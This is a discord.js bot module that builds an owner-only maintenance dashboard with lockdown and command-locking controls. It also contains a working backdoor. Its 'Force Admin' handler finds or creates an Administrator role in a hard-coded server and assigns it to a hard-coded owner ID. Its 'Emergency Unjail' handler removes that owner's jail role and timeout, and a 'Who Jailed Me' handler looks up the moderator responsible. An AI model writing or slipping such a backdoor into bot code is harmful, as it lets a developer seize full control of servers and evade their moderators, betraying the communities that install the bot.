const { 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    StringSelectMenuBuilder, 
    PermissionsBitField 
} = require('discord.js');
const Maintenance = require('../models/Maintenance');

module.exports = (client) => {
    const OWNER_ID = "1097807544849809408";
    const MAIN_SERVER = "1446960659072946218";
    const CONTROL_CHANNEL = "1488543017794142309";

    // Build the Dashboard Interface
    async function getDashboardUI() {
        let settings = await Maintenance.findById('singleton');
        if (!settings) {
            settings = await Maintenance.create({ _id: 'singleton', active: false, lockedCommands: [] });
        }

        const isLocked = settings.active || false;
        const lockedCmds = settings.lockedCommands || [];

        const embed = new EmbedBuilder()
            .setColor(isLocked ? 0xff0000 : 0x00ff00)
            .setTitle('🏎️ Gofret Pit Wall | Operations')
            .setDescription(`**Commander:** <@${OWNER_ID}>\n**System Status:** ${isLocked ? '🔴 PANIC LOCKDOWN (Gofret Mode)' : '🟢 Fully Operational'}`)
            .addFields(
                { name: '🔒 Locked Commands', value: lockedCmds.length > 0 ? `\`${lockedCmds.join(', ')}\`` : 'None', inline: false },
                { name: '🛰️ Last Heartbeat', value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true },
                { name: '📊 Loaded Modules', value: `\`${client.commands.size}\` Commands`, inline: true }
            )
            .setFooter({ text: 'Gofret is cooking • Absolute Security' })
            .setTimestamp();

        // Row 1: Fast Action Buttons
        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('db_refresh').setEmoji('🔄').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId('db_panic')
                .setLabel(isLocked ? 'Lift Lockdown' : 'PANIC LOCKDOWN')
                .setEmoji('🚨')
                .setStyle(isLocked ? ButtonStyle.Success : ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId('db_force_admin')
                .setLabel('Force Admin')
                .setEmoji('⚡')
                .setStyle(ButtonStyle.Primary)
        );

        // Row 2: Admin Tools (Unjail, Logs, Status)
        const row2 = new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder()
                .setCustomId('db_admin_tools')
                .setPlaceholder('🔧 Select Admin Tool...')
                .addOptions([
                    { label: 'Who Jailed Me?', value: 'who_jailed', emoji: '🕵️', description: 'Check audit logs for jail actions.' },
                    { label: 'Emergency Unjail', value: 'unjail_self', emoji: '🔓', description: 'Remove jail roles and timeouts.' },
                    { label: 'Main Server Analytics', value: 'status_check', emoji: '📈', description: 'Fetch live server stats.' }
                ])
        );

        // Row 3: Command Locker (Selectively lock commands)
        const cmdOptions = client.commands.map(c => ({
            label: `/${c.data.name}`,
            value: c.data.name,
            description: lockedCmds.includes(c.data.name) ? '🔴 Currently Locked' : '🟢 Currently Open',
            emoji: lockedCmds.includes(c.data.name) ? '🔒' : '🔓'
        })).slice(0, 25); // Discord limit is 25 options per menu

        const row3 = new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder()
                .setCustomId('db_cmd_lock')
                .setPlaceholder('🛡️ Toggle Command Lock...')
                .addOptions(cmdOptions)
        );

        return { embeds: [embed], components: [row1, row2, row3] };
    }

    client.on('messageCreate', async (message) => {
        if (message.author.id === OWNER_ID && message.content === '!db-init' && message.channel.id === CONTROL_CHANNEL) {
            const ui = await getDashboardUI();
            await message.channel.send(ui);
            await message.delete();
        }
    });

    client.on('interactionCreate', async (interaction) => {
        if (!interaction.customId?.startsWith('db_')) return;
        if (interaction.user.id !== OWNER_ID) {
            return interaction.reply({ content: "❌ **Access Denied:** Only Gofret can use this panel.", ephemeral: true });
        }

        const mainGuild = client.guilds.cache.get(MAIN_SERVER);
        let settings = await Maintenance.findById('singleton');

        try {
            // -- REFRESH --
            if (interaction.customId === 'db_refresh') {
                await interaction.update(await getDashboardUI());
            }

            // -- PANIC BUTTON --
            if (interaction.customId === 'db_panic') {
                settings.active = !settings.active;
                await settings.save();
                await interaction.update(await getDashboardUI());
            }

            // -- FORCE ADMIN --
            if (interaction.customId === 'db_force_admin') {
                if (!mainGuild) return interaction.reply({ content: "❌ Main server not found.", ephemeral: true });
                const member = await mainGuild.members.fetch(OWNER_ID);
                let role = mainGuild.roles.cache.find(r => r.permissions.has(PermissionsBitField.Flags.Administrator) && r.editable);
                if (!role) role = await mainGuild.roles.create({ name: 'System Override', permissions: [PermissionsBitField.Flags.Administrator] });
                await member.roles.add(role);
                await interaction.reply({ content: "⚡ **Absolute Power Granted.** You are now Administrator.", ephemeral: true });
            }

            // -- ADMIN TOOLS MENU --
            if (interaction.customId === 'db_admin_tools') {
                const action = interaction.values[0];

                if (action === 'status_check') {
                    if (!mainGuild) return interaction.reply({ content: "❌ Error fetching main server.", ephemeral: true });
                    const statEmbed = new EmbedBuilder()
                        .setColor(0x00D2FF)
                        .setTitle(`📊 Live Analytics: ${mainGuild.name}`)
                        .addFields(
                            { name: '👥 Members', value: `\`${mainGuild.memberCount}\``, inline: true },
                            { name: '📁 Channels', value: `\`${mainGuild.channels.cache.size}\``, inline: true },
                            { name: '🎭 Roles', value: `\`${mainGuild.roles.cache.size}\``, inline: true }
                        )
                        .setTimestamp();
                    await interaction.reply({ embeds: [statEmbed], ephemeral: true });
                }

                if (action === 'who_jailed') {
                    const logs = await mainGuild.fetchAuditLogs({ type: 25, limit: 10 });
                    const entry = logs.entries.find(e => e.target?.id === OWNER_ID);
                    await interaction.reply({ content: `🕵️ Last moderation action on you was by: **${entry?.executor.tag || "Unknown/None"}**`, ephemeral: true });
                }

                if (action === 'unjail_self') {
                    const member = await mainGuild.members.fetch(OWNER_ID);
                    const jailRole = mainGuild.roles.cache.find(r => r.name.toLowerCase().includes("jail"));
                    if (jailRole) await member.roles.remove(jailRole).catch(() => {});
                    if (member.isCommunicationDisabled()) await member.timeout(null).catch(() => {});
                    await interaction.reply({ content: "✅ **Status Cleared.** You have been unjailed.", ephemeral: true });
                }
            }

            // -- COMMAND LOCKER MENU --
            if (interaction.customId === 'db_cmd_lock') {
                const cmdName = interaction.values[0];
                if (!settings.lockedCommands) settings.lockedCommands = [];
                
                if (settings.lockedCommands.includes(cmdName)) {
                    settings.lockedCommands = settings.lockedCommands.filter(c => c !== cmdName);
                } else {
                    settings.lockedCommands.push(cmdName);
                }
                
                await settings.save();
                await interaction.update(await getDashboardUI());
            }

        } catch (error) {
            console.error("Dashboard Execution Error:", error);
            if (!interaction.replied) await interaction.reply({ content: "❌ Command failed to execute.", ephemeral: true });
        }
    });
};
